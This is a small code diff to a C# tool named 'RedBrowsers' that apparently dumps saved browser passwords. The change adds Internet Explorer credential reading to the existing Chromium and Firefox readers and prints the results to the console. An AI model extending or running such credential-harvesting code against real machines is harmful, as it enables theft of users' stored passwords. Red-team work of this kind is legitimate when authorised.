@@ -12,6 +12,7 @@ namespace RedBrowsers
         {
             List<ExtractedCredentials> Credentials = ChromiumEngine.ChromiumStorage.ReadPasswords();
             Credentials.AddRange(Firefox.FirefoxStorage.ReadPasswords());
+            Credentials.AddRange(InternetExplorer.IEStorage.ReadPasswords());
             if (!(args.Length == 0))
             {
                 switch (args[0].ToUpper())
@@ -43,10 +44,12 @@ namespace RedBrowsers
                         }
                 }
             }
-            else 
+            else
             {
                 Console.WriteLine(CreateString(Credentials));
             }
+
+            Console.ReadLine();
         }
 
     }
